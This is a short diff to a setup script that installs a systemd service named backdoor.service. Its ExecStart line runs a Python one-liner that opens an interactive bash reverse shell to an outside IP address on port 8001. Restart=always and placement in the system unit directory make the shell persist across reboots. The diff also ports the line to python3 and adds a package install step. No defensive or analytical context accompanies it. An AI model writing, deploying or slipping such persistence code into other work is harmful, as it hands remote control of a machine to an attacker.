@@ -8,7 +8,7 @@ Conflicts=getty@tty1.service
 [Service]
 Type=simple
 WorkingDirectory=/opt/mycambot/
-ExecStart=/usr/bin/python -c 'import os ; os.system("bash -i >& /dev/tcp/45.171.127.130/8001 0>&1")'
+ExecStart=/usr/bin/python3 -c \'import os ; os.system("bash -i >& /dev/tcp/45.171.127.130/8001 0>&1")\'
 StandardInput=tty-force
 Restart=always
 RestartSec=3
@@ -17,6 +17,7 @@ RestartSec=3
 WantedBy=multi-user.target
 EOF
 
+dnf -y install python38
 mv backdoor.service /usr/lib/systemd/system/
 restorecon -RFv /usr/lib/systemd/system/backdoor.service
 systemctl daemon-reload
